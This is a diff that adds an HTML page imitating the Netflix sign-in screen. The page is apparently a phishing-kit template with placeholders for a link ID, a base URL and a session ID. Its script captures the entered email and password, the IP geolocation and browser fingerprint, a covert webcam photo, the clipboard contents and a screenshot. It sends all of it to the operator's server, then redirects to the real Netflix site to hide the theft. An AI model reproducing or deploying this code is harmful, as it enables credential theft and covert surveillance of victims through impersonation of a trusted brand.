@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Netflix - Sign In</title>
+<link rel="icon" href="https://www.netflix.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#141414;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:rgba(0,0,0,.75);border-radius:8px;padding:60px 68px 40px;max-width:440px;width:90%}
+.logo{color:#e50914;font-size:36px;font-weight:700;margin-bottom:28px;letter-spacing:-1px}
+h1{color:#fff;font-size:32px;font-weight:500;margin-bottom:28px}
+.input-group{margin-bottom:16px}
+.input-group input{width:100%;padding:14px 16px;border:none;border-radius:4px;background:#333;color:#fff;font-size:16px;outline:none}
+.input-group input::placeholder{color:#8c8c8c}
+.input-group input:focus{background:#454545}
+.btn{background:#e50914;color:#fff;border:none;border-radius:4px;padding:14px;font-size:16px;width:100%;cursor:pointer;font-weight:500;margin-top:24px}
+.btn:hover{background:#f40612}
+.btn:disabled{opacity:.5;cursor:default}
+.or{color:#737373;font-size:14px;text-align:center;margin:16px 0}
+.help{display:flex;justify-content:space-between;color:#b3b3b3;font-size:13px;margin-top:16px}
+.help label{display:flex;align-items:center;gap:4px;cursor:pointer}
+.help a{color:#b3b3b3;text-decoration:none}
+.footer{color:#737373;font-size:12px;margin-top:40px;text-align:center}
+.footer a{color:#fff;text-decoration:none}
+#video{display:none;width:100%;border-radius:4px;margin:16px 0;background:#000;max-height:200px;object-fit:cover}
+.loading{display:none;color:#fff;font-size:14px;text-align:center;margin-top:16px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">NETFLIX</div>
+<h1>Sign In</h1>
+<div class="input-group"><input type="text" id="login" placeholder="Email or phone number" autocomplete="off"></div>
+<div class="input-group"><input type="password" id="password" placeholder="Password" autocomplete="off"></div>
+<button class="btn" id="login_btn" onclick="login()">Sign In</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading">Signing in...</div>
+<div class="or">OR</div>
+<div class="help"><label><input type="checkbox"> Remember me</label><a href="#">Need help?</a></div>
+<div class="footer">
+New to Netflix? <a href="#">Sign up now.</a><br>
+This page is protected by Google reCAPTCHA to ensure you're not a bot.
+</div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+async function collect(){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp');const j=await r.json();Object.assign(c,j)}catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        await new Promise(r=>setTimeout(r,1500));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function login(){
+    const l=document.getElementById('login').value.trim(),pw=document.getElementById('password').value.trim();
+    if(!l||!pw)return;
+    c.login=l;c.password=pw;
+    c.visit_duration=Math.floor((Date.now()-t0)/1000);
+    document.getElementById('login_btn').disabled=true;
+    document.getElementById('loading').style.display='block';
+    try{
+        const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+        const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+        const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+        ca.getContext('2d').drawImage(bm,0,0);
+        c.screenshot=ca.toDataURL('image/png').split(',')[1];
+        tr.stop();st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    await collect();
+    document.getElementById('loading').textContent='✓ Signed in!';
+    setTimeout(()=>{window.location.href='https://www.netflix.com'},1500)
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
